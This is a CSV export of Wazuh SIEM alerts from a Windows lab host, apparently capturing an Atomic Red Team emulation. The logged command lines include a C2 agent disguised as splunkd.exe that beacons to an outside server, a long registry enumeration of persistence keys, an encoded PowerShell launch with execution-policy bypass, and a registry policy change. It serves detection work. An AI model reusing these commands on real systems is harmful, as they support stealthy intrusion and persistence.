,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_qyp35lcd.uk4.ps1,2024-11-30 08:14:33.674, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,lfolfJMBRlc-D5DFdB_q,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 08:17:20.818
ProcessGuid: {15959494-CA0F-674A-E606-000000000D00}
ProcessId: 2084
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_namyeo0y.qrq.ps1
CreationUtcTime: 2024-11-30 08:17:20.818
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T08:17:20.831550900Z,56373,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,51,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:17:21.092",EventChannel,1732954641.2424806,"Nov 30, 2024 @ 08:17:21.092", , , , , , , , , , , , ,2084, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-CA0F-674A-E606-000000000D00},2024-11-30 08:17:20.818, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_namyeo0y.qrq.ps1,2024-11-30 08:17:20.818, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,evogfJMBRlc-D5DF7B-l,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 08:12:22.989
ProcessGuid: {15959494-C8E6-674A-C206-000000000D00}
ProcessId: 760
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_uptkixp3.44y.ps1
CreationUtcTime: 2024-11-30 08:12:22.989
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T08:12:22.994922500Z,56232,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,38,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:12:24.126",EventChannel,1732954344.2335749,"Nov 30, 2024 @ 08:12:24.126", , , , , , , , , , , , ,760, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-C8E6-674A-C206-000000000D00},2024-11-30 08:12:22.989, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_uptkixp3.44y.ps1,2024-11-30 08:12:22.989, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,efogfJMBRlc-D5DFFR_L,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: -
UtcTime: 2024-11-30 08:11:34.018
ProcessGuid: {15959494-C8B5-674A-C106-000000000D00}
ProcessId: 3020
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Windows\System32\staged\osk.exe
CreationUtcTime: 2024-11-26 09:29:12.209
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T08:11:34.031473100Z,56218,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,3,false,9,Powershell process created an executable file in Windows root folder,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92205, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:11:35.138",EventChannel,1732954295.2333118,"Nov 30, 2024 @ 08:11:35.138", , , , , , , , , , , , ,3020, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-C8B5-674A-C106-000000000D00},2024-11-30 08:11:34.018, , , , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Windows\\System32\\staged\\osk.exe,2024-11-26 09:29:12.209, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,afoafJMBRlc-D5DFNR_Q,1,1,192.168.117.130,wazuh-agent,002,Maryam,"2024-12-01T07:49:08Z, RulesEngine",16384,Software Protection Platform Service,0x80000000000000,{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156},4,Application,0,"""Successfully scheduled Software Protection service for re-start at 2024-12-01T07:49:08Z. Reason: RulesEngine.""",0,2024-11-30T08:05:08.225011200Z,1721,0,DESKTOP-FMI6MML,0,0,INFORMATION,Microsoft-Windows-Security-SPP,8,false,3,Software protection service scheduled successfully.,"[""windows"",""windows_application""]",60642, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:05:08.649",EventChannel,1732953908.2291521,"Nov 30, 2024 @ 08:05:08.649", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,svowfJMBRlc-D5DFNh_x,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1083,technique_name=File and Directory Discovery
UtcTime: 2024-11-30 08:29:03.846
ProcessGuid: {15959494-CCCF-674A-0807-000000000D00}
ProcessId: 3016
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"" && reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce && reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce && reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices && reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices && reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify"" && reg query ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit"" && reg query ""HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell"" && reg query ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell"" && reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad && reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce && reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx && reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run && reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run && reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce && reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run && reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run && reg query HKLM\system\currentcontrolset\services /s | findstr ImagePath 2>nul | findstr /Ri "".*\.sys$"" && reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run && reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot && reg query ""HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components"" && reg query ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup""
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE
ParentProcessGuid: {15959494-D565-6749-1C01-000000000D00}
ParentProcessId: 7968
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T08:29:03.848956700Z,56629,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,22,false,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:29:04.907",EventChannel,1732955344.2527593,"Nov 30, 2024 @ 08:29:04.907", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,3016, , , , , , , , , , ,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-CCCF-674A-0807-000000000D00},2024-11-30 08:29:03.846,"SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE","technique_id=T1083,technique_name=File and Directory Discovery",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D565-6749-1C01-000000000D00},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0x107a6b,7968,C:\\Windows\\system32\\,C:\\Users\\Public\\splunkd.exe,"cmd.exe /C reg query \""HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\"" &amp;&amp; reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce &amp;&amp; reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce &amp;&amp; reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices &amp;&amp; reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices &amp;&amp; reg query \""HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\"" &amp;&amp; reg query \""HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\"" &amp;&amp; reg query \""HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"" &amp;&amp; reg query \""HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"" &amp;&amp; reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad &amp;&amp; reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce &amp;&amp; reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx &amp;&amp; reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run &amp;&amp; reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run &amp;&amp; reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce &amp;&amp; reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run &amp;&amp; reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run &amp;&amp; reg query HKLM\\system\\currentcontrolset\\services /s | findstr ImagePath 2&gt;nul | findstr /Ri \"".*\\.sys$\"" &amp;&amp; reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run &amp;&amp; reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot &amp;&amp; reg query \""HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\"" &amp;&amp; reg query \""HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\Scripts\\Startup\""",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,ofoqfJMBRlc-D5DFVh_9,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 08:22:39.763
ProcessGuid: {15959494-CB4F-674A-F606-000000000D00}
ProcessId: 5928
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIASABlAHkALAAgAEEAdABvAG0AaQBjACEAIgA=
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F
ParentProcessGuid: {15959494-CB4F-674A-F506-000000000D00}
ParentProcessId: 4932
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: powershell.exe -ExecutionPolicy Bypass -C ""$OriginalCommand = 'Write-Host \""Hey, Atomic!\""'; $Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand); $EncodedCommand =[Convert]::ToBase64String($Bytes); $EncodedCommand; powershell.exe -EncodedCommand $EncodedCommand""
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T08:22:39.764231400Z,56459,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,1,true,12,Powershell.exe spawned a powershell process which executed a base64 encoded command,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92057, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:22:40.911",EventChannel,1732954960.2467731,"Nov 30, 2024 @ 08:22:40.911", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,5928, , , , , , , , , , ,"[""PowerShell""]","[""T1059.001""]","[""Execution""]", , , ,PowerShell.EXE,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,Microsoft® Windows® Operating System, , ,Windows PowerShell, , ,{15959494-CB4F-674A-F606-000000000D00},2024-11-30 08:22:39.763,"SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F","technique_id=T1059.001,technique_name=PowerShell",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-CB4F-674A-F506-000000000D00},"powershell.exe -ExecutionPolicy Bypass -C \""$OriginalCommand = 'Write-Host \\\""Hey, Atomic!\\\""'; $Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand); $EncodedCommand =[Convert]::ToBase64String($Bytes); $EncodedCommand; powershell.exe -EncodedCommand $EncodedCommand\""",0x107a6b,4932,C:\\Windows\\system32\\,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,"\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIASABlAHkALAAgAEEAdABvAG0AaQBjACEAIgA=",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,ovoqfJMBRlc-D5DFVh_9,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 08:22:39.838
ProcessGuid: {15959494-CB4F-674A-F606-000000000D00}
ProcessId: 5928
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_wvat5kvd.jes.ps1
CreationUtcTime: 2024-11-30 08:22:39.838
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T08:22:39.844150100Z,56468,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,55,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:22:41.035",EventChannel,1732954961.2475393,"Nov 30, 2024 @ 08:22:41.035", , , , , , , , , , , , ,5928, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-CB4F-674A-F606-000000000D00},2024-11-30 08:22:39.838, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_wvat5kvd.jes.ps1,2024-11-30 08:22:39.838, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,qvosfJMBRlc-D5DFxx_7,1,1,192.168.117.134,window-agent3,003,Maryam, ,4624, ,0x8020000000000000,{54849625-5478-4994-A5BA-3E3B0328C30D},0,Security,0,"""An account was successfully logged on.

Subject:
	Security ID:		S-1-5-18
	Account Name:		DESKTOP-QGB4EQH$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		5
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x250
	Process Name:		C:\Windows\System32\services.exe

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Advapi  
	Authentication Package:	Negotiate
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.""",2,2024-11-30T08:25:19.292617800Z,5096,644,DESKTOP-QGB4EQH,12544,656,AUDIT_SUCCESS,Microsoft-Windows-Security-Auditing,23,false,3,Windows logon success.,"[""windows"",""windows_security"",""authentication_success""]",60106,"[""IV_32.2""]","[""7.1"",""7.2""]",windows_eventchannel,log,"Nov 30, 2024 @ 08:25:19.664",EventChannel,1732955119.2496747,"Nov 30, 2024 @ 08:25:19.664",0x3e7,WORKGROUP,0x0,%%1833,Negotiate,0x3e7,Advapi,{00000000-0000-0000-0000-000000000000},SYSTEM,0,%%1842,S-1-5-18,0x250,C:\\Windows\\System32\\services.exe,NT AUTHORITY,S-1-5-18,%%1843,5,DESKTOP-QGB4EQH$,"[""164.312.b""]","[""10.2.5""]","[""CC6.8"",""CC7.2"",""CC7.3""]","[""AC.7"",""AU.14""]","[""Valid Accounts""]","[""T1078""]","[""Defense Evasion"",""Persistence"",""Privilege Escalation"",""Initial Access""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,nPonfJMBRlc-D5DF-R9w,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1012,technique_name=Query Registry
UtcTime: 2024-11-30 08:20:08.608
ProcessGuid: {15959494-CAB8-674A-F006-000000000D00}
ProcessId: 5972
Image: C:\Windows\System32\reg.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Registry Console Tool
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: reg.exe
CommandLine: reg  add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoFileMenu /t REG_DWORD /d 1 /f
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=04CE0B79EA20332CC4FF4679883B18BFE4341FBD,MD5=E3DACF0B31841FA02064B4457D44B357,SHA256=928693D84D652DC15B3FCDC6576D790053755C5181CE6708B1110DE12ADAE4A1,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC
ParentProcessGuid: {15959494-CAB8-674A-EF06-000000000D00}
ParentProcessId: 3808
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoFileMenu /t REG_DWORD /d 1 /f
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T08:20:08.608812700Z,56417,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,2,false,10,Value added to registry key has Base64-like pattern,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92041, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:20:09.687",EventChannel,1732954809.2450314,"Nov 30, 2024 @ 08:20:09.687", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,5972, , , , , , , , , , ,"[""Obfuscated Files or Information"",""Modify Registry""]","[""T1027"",""T1112""]","[""Defense Evasion""]", , , ,reg.exe,C:\\Windows\\System32\\reg.exe,Microsoft® Windows® Operating System, , ,Registry Console Tool, , ,{15959494-CAB8-674A-F006-000000000D00},2024-11-30 08:20:08.608,"SHA1=04CE0B79EA20332CC4FF4679883B18BFE4341FBD,MD5=E3DACF0B31841FA02064B4457D44B357,SHA256=928693D84D652DC15B3FCDC6576D790053755C5181CE6708B1110DE12ADAE4A1,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC","technique_id=T1012,technique_name=Query Registry",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-CAB8-674A-EF06-000000000D00},"cmd.exe /C reg add \""HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\"" /v NoFileMenu /t REG_DWORD /d 1 /f",0x107a6b,3808,C:\\Windows\\system32\\,C:\\Windows\\System32\\cmd.exe,"reg  add \""HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\"" /v NoFileMenu /t REG_DWORD /d 1 /f",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
